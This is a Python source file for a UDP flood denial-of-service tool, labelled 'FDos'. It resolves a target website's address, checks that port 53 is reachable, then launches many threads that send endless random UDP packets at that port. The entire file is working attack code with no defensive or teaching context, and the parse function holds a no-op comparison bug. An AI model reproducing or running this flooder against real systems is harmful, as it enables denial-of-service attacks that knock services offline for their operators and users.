#############################################################
# FDos - UDP FLOOD.                                         #
#############################################################

import socket
import threading
import sys
import threading
import random
import os
import ctypes
from urllib.parse import urlparse

class Udp:
    packet_sent = 0
    def __init__(self, target, thread, sleep) -> None:
        self.target = target
        self.thread = thread
        self.sleep = sleep

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def check_udp(self, ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, 53))
            sock.close()
            return True
        except: return False
        
    def att_sent(self):
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(f'Total Packet Sent : {self.packet_sent}')
    def random_message(self):
        return ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789") for _ in range(10))
    
    def send(self, ip):
        self.att_sent()
        try:
            while True:
                message = self.random_message()
                self.socket.sendto(message.encode(), (ip, 53))
                self.packet_sent += 1
        except Exception as e: print("Error when sending packet.")
    def parse(self):
        if "://" not in self.target:
            self.target == "http://"+self.target
        self.target = urlparse(self.target).netloc

    def attack(self):
        site = self.parse()
        try:
            ip = socket.gethostbyname(self.target)
        except:
            print("Error when detect ip."); sys.exit(0)
        print("Checking Port 53 is open.")
        if self.check_udp(ip):
            print("Port 53 is open.\nStart Attack...")
        else:
            print("Error port 53 is not open. Cannot continue"); sys.exit(0)
        th = []
        for _ in range(self.thread):
            thread = threading.Thread(target=self.send, args=(ip, ))
            th.append(thread)
            thread.start()
        for i in th:
            i.join()
        

